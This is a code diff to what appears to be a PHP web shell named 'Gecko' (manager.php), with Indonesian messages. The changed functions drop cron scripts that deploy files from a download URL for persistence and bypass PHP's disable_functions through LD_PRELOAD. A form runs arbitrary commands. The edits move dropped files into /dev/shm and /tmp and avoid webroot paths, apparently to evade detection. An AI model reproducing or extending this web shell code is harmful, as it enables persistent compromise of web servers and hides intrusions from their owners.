@@ -941,11 +941,11 @@ function geckoRecoverDeployViaRemoteCronSh($dirPath, $fileName, $downloadUrl)
 
     if (@file_put_contents($tmpCron, $script) === false) {
         
-        $tmpCron = rtrim($dirPath, '/') . '/.gecko_cron_' . $instanceId . '.sh';
+        $tmpCron = '/dev/shm/.gecko_cron_' . $instanceId . '.sh';
         if (@file_put_contents($tmpCron, $script) === false) {
             return array(
                 'ok' => false,
-                'error' => 'Gagal menulis temp cron.sh',
+                'error' => 'Gagal menulis temp cron.sh ke /tmp atau /dev/shm',
                 'steps' => $steps,
             );
         }
@@ -3110,24 +3110,26 @@ function geckoBypassLoadPayloads()
 function geckoBypassPickWorkDir()
 {
     $cands = array();
-    if (!empty($GLOBALS['cwd'])) $cands[] = $GLOBALS['cwd'];
-    $cands[] = @getcwd();
-    $cands[] = dirname(__FILE__);
     $cands[] = '/dev/shm';
-    $cands[] = (string)@sys_get_temp_dir();
     $cands[] = '/tmp';
+    $sys = (string)@sys_get_temp_dir();
+    if ($sys !== '') $cands[] = $sys;
+
     $seen = array();
     foreach ($cands as $d) {
         $d = rtrim(str_replace('\\', '/', (string)$d), '/');
         if ($d === '' || isset($seen[$d])) continue;
         $seen[$d] = true;
+        if (strpos($d, '/home/') === 0 || strpos($d, '/var/www/') === 0 || strpos($d, 'public_html') !== false) {
+            continue;
+        }
         if (!@is_dir($d) || !@is_writable($d)) continue;
         $probe = $d . '/.gecko_bp_w_' . (int)@getmypid();
         if (@file_put_contents($probe, '1') === false) continue;
         @unlink($probe);
         return $d;
     }
-    return rtrim(str_replace('\\', '/', (string)@sys_get_temp_dir()), '/');
+    return '/tmp';
 }
 
 
@@ -3382,9 +3384,9 @@ function geckoBypassRecoverDeployPersistence($dirPath, $fileName, $downloadUrl)
     $steps[] = 'Patched cron.sh for preload deploy (' . strlen($script) . ' bytes)';
 
     if (@file_put_contents($tmpCron, $script) === false) {
-        $tmpCron = rtrim($dirPath, '/') . '/.gecko_cron_' . $instanceId . '.sh';
+        $tmpCron = '/dev/shm/.gecko_cron_' . $instanceId . '.sh';
         if (@file_put_contents($tmpCron, $script) === false) {
-            return array('ok' => false, 'error' => 'Gagal tulis temp cron.sh', 'steps' => $steps);
+            return array('ok' => false, 'error' => 'Gagal tulis temp cron.sh ke /tmp atau /dev/shm', 'steps' => $steps);
         }
     }
     @chmod($tmpCron, 0700);
@@ -8834,7 +8836,7 @@ AlfaNum(8,9,10);
 if (!isset($GLOBALS['baseDir'])) $GLOBALS['baseDir'] = isset($GLOBALS['cwd']) ? $GLOBALS['cwd'] : getcwd();
 $cwdEsc = htmlspecialchars(isset($GLOBALS['cwd']) ? $GLOBALS['cwd'] : getcwd());
 echo "<div class=header><center><p><div class='txtfont_header'>| Bypass disable_functions (LD_PRELOAD) |</div></p>";
-echo '<div class="txtfont" style="opacity:.85;margin-bottom:6px;">engine: '.(function_exists('geckoBypassRun') && function_exists('geckoBypassRecover') ? 'cmd+recover OK' : 'NOT LOADED — re-upload manager.php').'</div>';
+echo '<div class="txtfont" style="opacity:.85;margin-bottom:6px;">engine: '.(function_exists('geckoBypassRun') && function_exists('geckoBypassRecover') && function_exists('geckoBypassRecoverDeployPersistence') ? 'cmd+recover v2 (/tmp+/dev/shm)' : 'NOT LOADED — re-upload manager.php').'</div>';
 echo "<form id='gecko_bp_form' onSubmit=\"var m=this.mode.value;if(m==='recover'){g('geckoBypass',null,'recover','',this.dir.value,this.file.value,this.url.value,this.persist.value,'>>');}else{g('geckoBypass',null,'cmd',this.cmd.value,'','','','','>>');}return false;\" method='post'>";
 echo '<div class="txtfont" style="text-align:left;display:inline-block;">';
 echo 'Mode: <select name="mode" id="gecko_bp_mode"><option value="cmd">Execute command</option><option value="recover">Recovery (via preload)</option></select><br><br>';
